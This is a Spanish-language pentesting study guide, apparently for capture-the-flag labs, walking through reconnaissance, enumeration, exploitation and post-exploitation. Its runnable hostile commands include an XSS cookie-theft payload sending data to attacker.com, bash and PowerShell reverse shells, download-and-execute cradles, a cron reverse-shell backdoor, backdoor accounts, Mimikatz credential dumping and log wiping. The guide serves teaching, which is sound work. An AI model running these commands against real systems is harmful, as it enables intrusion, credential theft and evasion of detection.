# 🎯 PETS Framework - Guía Detallada

**PETS** son las 4 fases fundamentales del pentesting. Esta guía te explica cada fase en profundidad.

---

## 📊 Visión General de PETS

```
┌─────────────────────────────────────────────────────────────┐
│                    CICLO PETS COMPLETO                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1️⃣ PASSIVE        2️⃣ ENUMERATION    3️⃣ EXPLOITATION      │
│  RECONNAISSANCE      & SCANNING        & GAINING ACCESS     │
│  ↓                  ↓                  ↓                    │
│  Información        Escaneo            Ataque               │
│  sin contacto       directo            real                 │
│  ↓                  ↓                  ↓                    │
│  ⚡ Silencioso      🔍 Detectable     🎯 Objetivo          │
│                                                 ↓           │
│  ←──────────4️⃣ POST-EXPLOITATION ←───────────────         │
│             Escalada & Consolidación                        │
│             ↓                                               │
│             ✅ Control Completo del Sistema               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 1️⃣ PHASE 1: PASSIVE RECONNAISSANCE

### 📌 Definición

**Recopilación de información SIN contacto directo con el objetivo.**

El atacante busca información a través de fuentes públicas y disponibles, sin generarenerar tráfico de red hacia el objetivo.

### 🎯 Objetivos

- [ ] Recopilar información básica de la organización
- [ ] Identificar dominios relacionados
- [ ] Encontrar empleados y contactos
- [ ] Descubrir tecnologías utilizadas
- [ ] Identificar direcciones IP públicas
- [ ] Encontrar posibles puertos abiertos
- [ ] Buscar vulnerabilidades conocidas

### 🔍 Técnicas Principales

#### 1. WHOIS Lookup
```bash
whois example.com
# Obtiene: registrante, fecha de registro, nameservers, fecha de expiración
```

**Información obtenida:**
- Propietario del dominio
- Fecha de registro
- Servidores de nombres (DNS)
- Contacto administrativo

#### 2. DNS Recon
```bash
# Resolución básica
dig example.com

# Obtener registros A, MX, TXT
dig example.com ANY

# Transferencia de zona (zone transfer)
dig @ns1.example.com example.com axfr
```

**Registros DNS útiles:**
- **A**: Dirección IP
- **MX**: Servidor de correo
- **NS**: Nameservers
- **TXT**: Información texto (SPF, DMARC, verificaciones)
- **CNAME**: Alias de dominio
- **SOA**: Información de autoridad

#### 3. Búsquedas en Línea

**Google Dorks:**
```
site:example.com                    # Solo en ese dominio
site:example.com filetype:pdf       # Solo PDFs
site:example.com inurl:admin        # URLs con "admin"
"example.com" "password"            # Palabras específicas
intitle:"Index of"                  # Directorios listados
```

**Herramientas Online:**
- **Shodan.io** - Motor de búsqueda de dispositivos IoT y servidores
- **Censys.io** - Base de datos de certificados SSL
- **Zoomeye.org** - Similar a Shodan
- **BuiltWith.com** - Identifica tecnologías web
- **Hunter.io** - Encontrar emails corporativos

#### 4. OSINT (Open Source Intelligence)

```bash
# TheHarvester - Recopilador automático
theHarvester -d example.com -l 500 -b google,linkedin,hunter

# Maltego - Herramienta gráfica de investigación
# (Interfaz de usuario)

# Recon-ng - Framework de recopilación
recon-ng
> marketplace install all
> workspaces create ejemplo
> use recon/domains-hosts/google_site_api
```

**Fuentes de Información:**
- Redes sociales (LinkedIn, Twitter, Facebook)
- Archives.org (Wayback Machine)
- Registros públicos
- Portales de empleo
- Publicaciones de prensa
- Documentos públicos (SEC filings, etc.)

### 📊 MITRE ATT&CK - Fase 1

**Tácticas Aplicables:**
- **Reconnaissance (TA0043)**
  - T1590: Gather Victim Network Information
  - T1591: Gather Victim Org Info
  - T1598: Phishing for Information
  - T1598.003: Phishing Link

### ✅ Checklist Fase 1

- [ ] WHOIS lookup completado
- [ ] DNS enumeration realizado
- [ ] Google Dorks ejecutados
- [ ] Shodan/Censys revisados
- [ ] Búsquedas sociales hechas
- [ ] Archive.org verificado
- [ ] Información compilada y documentada

### 💡 Notas Importantes

> **Sigilo:** En esta fase, NO generamos tráfico hacia el objetivo. El objetivo NO sabe que está siendo investigado.

> **Fuentes:** Usamos solo fuentes públicas, información disponible libremente.

> **Valor:** Aunque parece simple, la información aquí obtenida es muy valiosa para las próximas fases.

---

## 2️⃣ PHASE 2: ENUMERATION

### 📌 Definición

**Escaneo activo y directo del objetivo para identificar servicios, puertos y configuraciones.**

A diferencia de reconocimiento pasivo, ahora SÍ contactamos directamente el objetivo. Genera tráfico de red que PUEDE ser detectado.

### 🎯 Objetivos

- [ ] Identificar hosts vivos en la red
- [ ] Descubrir puertos abiertos
- [ ] Identificar servicios ejecutándose
- [ ] Detectar versiones de software
- [ ] Encontrar configuraciones débiles
- [ ] Identificar vulnerabilidades conocidas
- [ ] Enumerar usuarios del sistema
- [ ] Descubrir directorios web

### 🔍 Técnicas Principales

#### 1. Network Scanning con Nmap

**Descubrimiento de Hosts:**
```bash
# Ping sweep (ICMP)
nmap -sn 10.10.11.0/24
# Lista hosts vivos

# TCP SYN Ping
nmap -PS -sn 10.10.11.0/24
# Ping usando SYN en puerto 80

# UDP Ping
nmap -PU -sn 10.10.11.0/24
```

**Escaneo de Puertos:**
```bash
# Top 1000 puertos
nmap 10.10.11.x

# Todos los puertos (rápido)
nmap -p- --open 10.10.11.x

# Puertos específicos
nmap -p 22,80,443,445 10.10.11.x

# UDP
nmap -sU 10.10.11.x

# Técnicas stealthier (evitar detección)
nmap -sS 10.10.11.x  # TCP SYN (stealthy)
nmap -sF 10.10.11.x  # TCP FIN (stealthy)
```

**Detección de Versiones:**
```bash
nmap -sV 10.10.11.x
# -sV: Detecta versiones de servicios
# Ejemplo: Apache 2.4.41, OpenSSH 7.6p1
```

**Escaneo Completo:**
```bash
nmap -sV -sC -A --script vuln 10.10.11.x -oA scan_results
# -sV: Service version
# -sC: Run default scripts
# -A: Aggressive (SO detection, service versions, traceroute)
# --script vuln: Scripts de vulnerabilidades
# -oA: Output en todos los formatos
```

#### 2. Web Enumeration

**Descubrimiento de Directorios:**
```bash
# Gobuster
gobuster dir -u http://10.10.11.x -w wordlist.txt -t 50

# Con extensiones
gobuster dir -u http://10.10.11.x -w wordlist.txt -x .php,.html,.txt

# Dirsearch
dirsearch -u http://10.10.11.x -w wordlist.txt

# FFuf (fuzzing)
ffuf -u http://10.10.11.x/FUZZ -w wordlist.txt
```

**Escaneo de Vulnerabilidades:**
```bash
# Nikto
nikto -h http://10.10.11.x

# Output detallado
nikto -h http://10.10.11.x -o report.html -F html
```

**Análisis de Tecnologías:**
```bash
# Wappalyzer (navegador)
# O en terminal: curl -s http://10.10.11.x | grep -i "wordpress\|drupal\|joomla"

# Whatweb
whatweb http://10.10.11.x
```

#### 3. SMB Enumeration

```bash
# Listar comparticiones
smbclient -L //10.10.11.x

# Acceso anónimo
smbclient //10.10.11.x/share

# Enum4linux completo
enum4linux -a 10.10.11.x

# CrackMapExec
crackmapexec smb 10.10.11.x --shares
crackmapexec smb 10.10.11.x -u '' -p '' --shares
```

#### 4. LDAP Enumeration

```bash
# Búsqueda LDAP
ldapsearch -h 10.10.11.x -x -s base namingContexts

# Full dump
ldapsearch -h 10.10.11.x -x -b "dc=domain,dc=com" "*"

# Usuarios
ldapsearch -h 10.10.11.x -x -b "dc=domain,dc=com" "(&(objectClass=user))"
```

#### 5. FTP/SSH/SSH Enumeration

```bash
# FTP
ftp 10.10.11.x
# Probar anonymous:anonymous

# SSH
ssh -v 10.10.11.x
# Ver versión del servidor

# Banner grabbing
nc -v 10.10.11.x 22
```

### 📊 MITRE ATT&CK - Fase 2

**Tácticas Aplicables:**
- **Discovery (TA0007)**
  - T1046: Network Service Scanning
  - T1592: Gather Victim Host Information
  - T1526: Cloud Service Discovery

- **Resource Development (TA0042)**
  - T1589: Gather Victim Identity Information

### ✅ Checklist Fase 2

- [ ] Network ping sweep completado
- [ ] Escaneo completo de puertos realizado
- [ ] Versiones de servicios identificadas
- [ ] Web enumeration completado
- [ ] SMB enumeration completado (si aplica)
- [ ] Usuarios/dominios enumerados
- [ ] Vulnerabilidades documentadas
- [ ] Reportes generados

### 💡 Notas Importantes

> **Detectable:** El objetivo VERÁ este tráfico en sus logs/IDS. Puedes ser detectado.

> **Información Valiosa:** Aquí obtenemos las vulnerabilidades que explotaremos.

> **Severidad:** Una enumeración profunda aquí = explotación fácil después.

---

## 3️⃣ PHASE 3: EXPLOITATION

### 📌 Definición

**Ataque activo al objetivo usando vulnerabilidades identificadas.**

Ahora ejecutamos exploits para obtener acceso al sistema.

### 🎯 Objetivos

- [ ] Obtener acceso inicial al sistema
- [ ] Ejecutar comandos en el objetivo
- [ ] Obtener shell interactiva
- [ ] Establecer persistencia inicial
- [ ] Documentar método de acceso

### 🔍 Técnicas Principales

#### 1. Web Exploitation

**SQL Injection:**
```bash
# Manual
URL: http://10.10.11.x/login.php?id=1' OR '1'='1
# Si funciona, veremos datos sin autenticación

# SQLmap automatizado
sqlmap -u "http://10.10.11.x/login.php?id=1" --dbs
sqlmap -u "http://10.10.11.x/login.php" --data="user=*&pass=*" --dbs
```

**Cross-Site Scripting (XSS):**
```javascript
// Payload simple
<script>alert('XSS')</script>

// Robo de cookies
<script>
fetch('http://attacker.com/steal.php?cookie=' + document.cookie)
</script>

// En formulario vulnerable
<img src=x onerror="alert('XSS')">
```

**File Upload:**
```bash
# Subir shell PHP
# Form: POST /upload.php
# File: shell.php (contiene código PHP)

# Acceder: http://10.10.11.x/uploads/shell.php?cmd=id
```

#### 2. RCE (Remote Code Execution)

**Shells Inversos:**
```bash
# Escucha en tu máquina
nc -lvnp 4444

# Desde target (Linux)
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1

# Desde target (Windows PowerShell)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.x",4444);...
```

**Metasploit:**
```bash
msfconsole
> search smb
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS 10.10.11.x
> set LHOST 10.10.14.x
> set LPORT 4444
> exploit
```

#### 3. Transferencia de Archivos

```bash
# Desde tu máquina (servidor)
python3 -m http.server 8000

# Desde target (cliente)
wget http://10.10.14.x:8000/exploit
curl http://10.10.14.x:8000/exploit -o exploit
powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x:8000/script.ps1')"
```

### 📊 MITRE ATT&CK - Fase 3

**Tácticas Aplicables:**
- **Initial Access (TA0001)**
  - T1190: Exploit Public-Facing Application
  - T1199: Trusted Relationship

- **Execution (TA0002)**
  - T1059: Command and Scripting Interpreter
  - T1651: Exploitation for Credential Access

### ✅ Checklist Fase 3

- [ ] Vulnerabilidad seleccionada identificada
- [ ] Exploit preparado/compilado
- [ ] Acceso inicial obtenido
- [ ] Shell funcional establecido
- [ ] Acceso verificado (id, whoami, etc.)

### 💡 Notas Importantes

> **Crítico:** Este es el punto sin retorno. A partir de aquí, definitivamente somos detectados.

> **Documentación:** Registra exactamente qué vulnerabilidad explotaste.

> **Persistencia:** Asegura que el acceso se mantenga (cron job, usuario backdoor, etc.)

---

## 4️⃣ PHASE 4: POST-EXPLOITATION

### 📌 Definición

**Consolidación del acceso y escalada de privilegios.**

Ya tenemos acceso, pero probablemente como usuario normal. Ahora escalamos a root/SYSTEM.

### 🎯 Objetivos

- [ ] Enumerar el sistema objetivo
- [ ] Encontrar vectores de escalada
- [ ] Elevar privilegios a root/SYSTEM
- [ ] Obtener las flags
- [ ] Establecer persistencia (si aplica)
- [ ] Limpiar huellas

### 🔍 Técnicas Principales

#### 1. Enumeración Post-Explotación (Linux)

```bash
# Información básica
whoami
id
hostname
uname -a
cat /etc/os-release

# Permisos SUDO
sudo -l

# Binarios SUID
find / -perm -4000 2>/dev/null

# Cron jobs
cat /etc/crontab
crontab -l
ls -la /etc/cron.d/

# Scripts de enumeración
curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

#### 2. Enumeración Post-Explotación (Windows)

```powershell
# Información básica
whoami
whoami /priv
systeminfo

# Servicios
wmic service list brief
Get-Service | Where-Object {$_.Status -eq "Running"}

# Usuarios y grupos
Get-LocalUser
Get-LocalGroup
net user

# Scripts
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
Invoke-AllChecks
```

#### 3. Escalada de Privilegios (Linux)

**SUID Binaries:**
```bash
find / -perm -4000 2>/dev/null
# Si nmap, find, o vim tienen SUID → se pueden abusar

# Ejemplo: nmap con SUID
nmap --interactive
nmap> !sh
# Acceso root
```

**Sudo Debility:**
```bash
sudo -l
# Si permite: sudo /bin/bash, sudo /bin/python, etc.
sudo bash
# Acceso root inmediato
```

**Kernel Exploits:**
```bash
uname -r
# Buscar en exploit-db por esa versión del kernel
# Compilar y ejecutar exploit
gcc -o exploit exploit.c
./exploit
```

#### 4. Escalada de Privilegios (Windows)

**UAC Bypass:**
```powershell
# Si tienes permisos suficientes
Start-Process powershell -Verb RunAs

# O usar UACMe
.\uacme.exe
```

**Servicios con Permisos Débiles:**
```powershell
# Buscar servicios
Get-WmiObject win32_service | Select Name,PathName,State

# Si permisos débiles en executable
# Reemplazar executable y reiniciar servicio
```

**Mimikatz - Extracción de Credenciales:**
```powershell
mimikatz.exe
mimikatz > privilege::debug
mimikatz > sekurlsa::logonpasswords
# Obtiene hashes/contraseñas en memoria
```

#### 5. Obtención de Flags

```bash
# Usuario flag
cat /home/user/user.txt

# Root flag
cat /root/root.txt
# o
cat /home/user/flag.txt
```

#### 6. Persistencia (Opcional)

**Linux:**
```bash
# Crear usuario backdoor
useradd -m backdoor -s /bin/bash
echo "backdoor:password" | chpasswd

# Cron job reverso
(crontab -l; echo "* * * * * bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -
```

**Windows:**
```cmd
# Crear usuario
net user backdoor password123 /add
net localgroup administrators backdoor /add

# Scheduled task
schtasks /create /tn "Backdoor" /tr "cmd /c powershell..." /sc onlogon
```

#### 7. Limpiar Huellas

```bash
# Historial bash
history -c
export HISTFILE=/dev/null
rm ~/.bash_history

# Logs del sistema (requiere root)
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog

# Archivos temporales
rm /tmp/exploit
rm /tmp/linpeas.sh

# En Windows
Get-EventLog -List | Remove-EventLog
```

### 📊 MITRE ATT&CK - Fase 4

**Tácticas Aplicables:**
- **Privilege Escalation (TA0004)**
  - T1548.004: Abuse Elevation Control Mechanism
  - T1053: Scheduled Task/Job

- **Defense Evasion (TA0005)**
  - T1070: Indicator Removal

- **Persistence (TA0003)**
  - T1078: Valid Accounts
  - T1053: Scheduled Task

- **Credential Access (TA0006)**
  - T1110: Brute Force

### ✅ Checklist Fase 4

- [ ] Enumeración post-explotación completada
- [ ] Vectores de escalada identificados
- [ ] Exploit de escalada seleccionado
- [ ] Escalada ejecutada exitosamente
- [ ] Root/SYSTEM access verificado
- [ ] Ambas flags obtenidas
- [ ] Persistencia establecida (si requerido)
- [ ] Huellas limpias

### 💡 Notas Importantes

> **Verifica:** Siempre verifica que eres root: `id` debe mostrar uid=0

> **Documentar:** Cada paso debe quedar documentado en tu writeup

> **Lecciones:** Aprende por qué funcionó - no solo que funcionó

---

## 🎯 Mapeo de PETS a MITRE ATT&CK

| Fase PETS | Tácticas MITRE | Ejemplos |
|-----------|----------------|----------|
| **Passive** | Reconnaissance | Gather info, Google Dorks |
| **Enumeration** | Discovery, Resource Dev | Network scan, Service enum |
| **Exploitation** | Initial Access, Execution | SQL Injection, RCE |
| **Post-Exploitation** | Privilege Escalation, Persistence | Escalada, Backdoor |

---

## 📚 Recursos Adicionales

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

## 🔄 Ciclo Iterativo

```
┌─────────────┐
│  Reconocimiento
│  Pasivo
└────────┬────┘
         ↓
    ┌─────────────┐
    │ Enumeración │
    │ Activa      │
    └────────┬────┘
             ↓
       ┌─────────────┐
       │ Exploración │
       │ Ataque      │
       └────────┬────┘
                ↓
          ┌─────────────┐
          │ Post-Explot │
          │ Escalada    │
          └────────┬────┘
                   ↓
            ¿Éxito Total?
            /          \
          SÍ            NO
          │             │
          └─→ Reportar  └→ Volver a Fase 3/2
                │
                ↓
           ✅ Completado
```

---

<div align="center">

### 🎯 Domina PETS y Serás un Pentester Profesional

**Recuerda:** Cada fase depende de la anterior.  
No saltes pasos.

</div>
